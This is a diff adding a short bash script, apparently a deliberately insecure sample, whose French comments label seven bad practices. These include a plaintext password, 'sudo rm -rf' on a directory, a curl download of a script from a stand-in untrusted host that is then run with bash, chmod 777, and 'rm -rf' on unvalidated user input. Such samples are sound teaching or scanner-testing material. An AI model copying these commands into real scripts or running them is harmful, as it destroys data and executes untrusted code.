@@ -1,0 +1,29 @@
+#!/bin/bash
+
+# 1. Stockage d'informations sensibles en texte clair
+PASSWORD="MySuperSecretPassword123"
+echo "Mot de passe : $PASSWORD"
+
+# 2. Utilisation de sudo sans vérification
+sudo rm -rf /important/directory
+
+# 3. Utilisation de chemins absolus et d'entrées non validées
+INPUT_FILE="/tmp/user_input.txt"
+cat $INPUT_FILE
+
+# 4. Téléchargement de fichiers non vérifiés depuis Internet
+curl -O http://untrustedwebsite.com/malicious_script.sh
+bash malicious_script.sh
+
+# 5. Permissions incorrectes pour les fichiers
+touch /tmp/important_file
+chmod 777 /tmp/important_file
+
+# 6. Command Injection
+read -p "Enter filename to delete: " filename
+rm -rf $filename  # Vulnérabilité aux injections de commandes
+
+# 7. Ne pas vérifier l'intégrité des fichiers exécutés
+if [ -f "./install.sh" ]; then
+    ./install.sh
+fi
